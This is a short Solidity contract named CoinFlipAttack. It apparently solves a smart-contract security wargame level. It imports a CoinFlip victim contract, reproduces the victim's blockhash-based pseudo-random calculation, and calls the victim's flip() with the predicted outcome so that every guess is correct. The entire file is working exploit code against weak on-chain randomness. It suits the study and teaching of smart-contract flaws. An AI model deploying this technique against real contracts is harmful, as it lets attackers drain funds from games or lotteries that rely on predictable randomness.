pragma solidity ^0.4.18;

import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    
    function setVictim(address _addr) public {
        victimContract = CoinFlip(_addr);
    }

    function flip() public returns (bool) {
        // Same PRNG as in victim contract
        // The "random" numbers will be exactly the same in both contracts
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        side = coinFlip == 1 ? true : false;

        return victimContract.flip(side);
    }

}
